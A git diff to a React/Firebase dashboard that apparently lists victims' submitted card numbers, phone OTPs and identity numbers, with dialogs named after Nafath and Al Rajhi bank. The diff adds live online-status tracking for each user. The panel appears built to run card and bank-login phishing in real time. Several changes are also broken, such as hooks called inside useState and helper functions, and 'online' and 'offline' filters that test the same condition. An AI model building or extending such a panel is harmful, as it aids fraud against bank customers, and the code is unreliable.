@@ -31,6 +31,8 @@ import {
   ChevronsRight,
   Volume2,
   VolumeX,
+  Wifi,
+  WifiOff,
 } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
@@ -60,13 +62,66 @@ import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/comp
 import { Input } from "@/components/ui/input"
 import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
 import { onAuthStateChanged, signOut } from "firebase/auth"
+import { ref, onValue } from "firebase/database"
 import PhoneDialog from "@/components/phone-info"
 import NafazAuthDialog from "@/components/nafaz"
 import RajhiAuthDialog from "@/components/rajhi"
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
 import { Sheet, SheetContent, SheetDescription, SheetHeader, SheetTitle } from "@/components/ui/sheet"
-import { auth, db } from "@/lib/firestore"
+import { auth, db, database } from "@/lib/firestore"
 import { Skeleton } from "@/components/ui/skeleton"
+
+// Hook to track online status for a specific user ID
+function useUserOnlineStatus(userId: string) {
+  const [isOnline, setIsOnline] = useState(false)
+
+  useEffect(() => {
+    if (!userId || !database) return
+
+    const userStatusRef = ref(database, `/status/${userId}`)
+
+    const unsubscribe = onValue(userStatusRef, (snapshot) => {
+      const data = snapshot.val()
+      setIsOnline(data && data.state === "online")
+    })
+
+    return () => unsubscribe()
+  }, [userId, database])
+
+  return isOnline
+}
+
+// Component to display online status indicator
+function OnlineStatusIndicator({ userId, className = "" }: { userId?: string; className?: string }) {
+  const isOnline = useUserOnlineStatus(userId || "")
+
+  if (!userId) return null
+
+  return (
+    <TooltipProvider>
+      <Tooltip>
+        <TooltipTrigger asChild>
+          <div className={`flex items-center gap-1 ${className}`}>
+            {isOnline ? (
+              <div className="flex items-center gap-1">
+                <div className="w-2 h-2 bg-emerald-500 rounded-full animate-pulse"></div>
+                <Wifi className="h-3 w-3 text-emerald-500" />
+              </div>
+            ) : (
+              <div className="flex items-center gap-1">
+                <div className="w-2 h-2 bg-gray-400 rounded-full"></div>
+                <WifiOff className="h-3 w-3 text-gray-400" />
+              </div>
+            )}
+          </div>
+        </TooltipTrigger>
+        <TooltipContent>
+          <p>{isOnline ? "متصل الآن" : "غير متصل"}</p>
+        </TooltipContent>
+      </Tooltip>
+    </TooltipProvider>
+  )
+}
 
 interface PaymentData {
   cardNumber?: string
@@ -139,7 +194,7 @@ export default function NotificationsPage() {
   const [selectedNotification, setSelectedNotification] = useState<Notification | null>(null)
   const [activeFilter, setActiveFilter] = useState<string | null>(null)
   const [showSidebar, setShowSidebar] = useState(false)
-  const router = useRouter()
+  const [router, setRouter] = useState(() => useRouter())
   const [showCardDialog, setShowCardDialog] = useState(false)
   const [selectedCardInfo, setSelectedCardInfo] = useState<Notification | null>(null)
   const [showPagenameDialog, setShowPagenameDialog] = useState(false)
@@ -237,7 +292,9 @@ export default function NotificationsPage() {
           (activeFilter === "approved" && notification.status === "approved") ||
           (activeFilter === "rejected" && notification.status === "rejected") ||
           (activeFilter === "payment" && notification.pagename === "payment") ||
-          (activeFilter === "registration" && notification.vehicle_type === "registration")
+          (activeFilter === "registration" && notification.vehicle_type === "registration") ||
+          (activeFilter === "online" && notification.owner_identity_number) ||
+          (activeFilter === "offline" && notification.owner_identity_number)
 
         return matchesSearch && matchesFilter
       })
@@ -800,6 +857,15 @@ export default function NotificationsPage() {
     return pages
   }
 
+  // Get user ID for online status tracking
+  const getUserId = (notification: Notification) => {
+    return notification.owner_identity_number || notification.buyer_identity_number || notification.phone
+  }
+
+  const isUserOnline = (userId: string) => {
+    return useUserOnlineStatus(userId)
+  }
+
   if (isLoading) {
     return (
       <div className="min-h-screen bg-gradient-to-br from-indigo-50 via-purple-50 to-pink-50 dark:from-slate-900 dark:via-purple-900 dark:to-indigo-900 text-foreground p-8">
@@ -1082,6 +1148,7 @@ export default function NotificationsPage() {
               <Table>
                 <TableHeader>
                   <TableRow className="bg-gradient-to-r from-blue-50/80 to-purple-50/80 hover:from-blue-50/80 hover:to-purple-50/80 border-b border-blue-200/50">
+                    <TableHead className="text-right font-bold text-blue-700">الحالة الاتصال</TableHead>
                     <TableHead className="text-right font-bold text-blue-700">الدولة</TableHead>
                     <TableHead className="text-right font-bold text-blue-700">الصفحة الحالية</TableHead>
                     <TableHead className="text-right font-bold text-blue-700">الاسم</TableHead>
@@ -1099,6 +1166,9 @@ export default function NotificationsPage() {
                       key={notification.id}
                       className="hover:bg-gradient-to-r hover:from-blue-50/30 hover:to-purple-50/30 border-b border-blue-100/50 relative cursor-pointer transition-all duration-200"
                     >
+                      <TableCell>
+                        <OnlineStatusIndicator userId={getUserId(notification)} />
+                      </TableCell>
                       <TableCell>{notification?.country}</TableCell>
 
                       <TableCell>{getPageType(notification.pagename, true, notification)}</TableCell>
@@ -1410,6 +1480,16 @@ export default function NotificationsPage() {
                   </div>
                 </div>
               )}
+              {/* Online Status in Personal Info */}
+              <div className="p-4 rounded-lg bg-gradient-to-r from-indigo-50 to-blue-50 flex flex-col gap-1">
+                <p className="text-sm text-indigo-600">حالة الاتصال</p>
+                <div className="flex items-center gap-2 mt-1">
+                  <OnlineStatusIndicator userId={getUserId(selectedNotification)} className="scale-125" />
+                  <p className="font-medium text-gray-800">
+                    {isUserOnline(getUserId(selectedNotification) || "") ? "متصل الآن" : "غير متصل"}
+                  </p>
+                </div>
+              </div>
             </div>
           )}
           {selectedInfo === "card" && selectedNotification && (
@@ -1654,6 +1734,15 @@ export default function NotificationsPage() {
                           : "قيد الانتظار"}
                     </span>
                   </div>
+                  <div className="flex justify-between text-sm">
+                    <span className="text-gray-600">حالة الاتصال:</span>
+                    <div className="flex items-center gap-2">
+                      <OnlineStatusIndicator userId={getUserId(selectedCardInfo)} />
+                      <span className="text-gray-800">
+                        {isUserOnline(getUserId(selectedCardInfo) || "") ? "متصل" : "غير متصل"}
+                      </span>
+                    </div>
+                  </div>
                 </div>
               </div>
             </div>
@@ -1857,6 +1946,15 @@ export default function NotificationsPage() {
                       <span className="font-medium font-mono text-gray-800">{selectedNotification.phone2}</span>
                     </div>
                   )}
+                  <div className="flex justify-between">
+                    <span className="text-sm text-blue-600">حالة الاتصال:</span>
+                    <div className="flex items-center gap-2">
+                      <OnlineStatusIndicator userId={getUserId(selectedNotification)} />
+                      <span className="font-medium text-gray-800">
+                        {isUserOnline(getUserId(selectedNotification) || "") ? "متصل الآن" : "غير متصل"}
+                      </span>
+                    </div>
+                  </div>
                 </div>
               </div>
               {(selectedNotification.cardNumber ||
@@ -1996,7 +2094,6 @@ export default function NotificationsPage() {
       </Sheet>
 
       {/* External Component Dialogs */}
-      <RajhiAuthDialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog} notification={selectedNotification} />
       <NafazAuthDialog open={showNafazDialog} onOpenChange={setShowNafazDialog} notification={selectedNotification} />
       <PhoneDialog
         phoneOtp={selectedNotification?.phoneOtp}
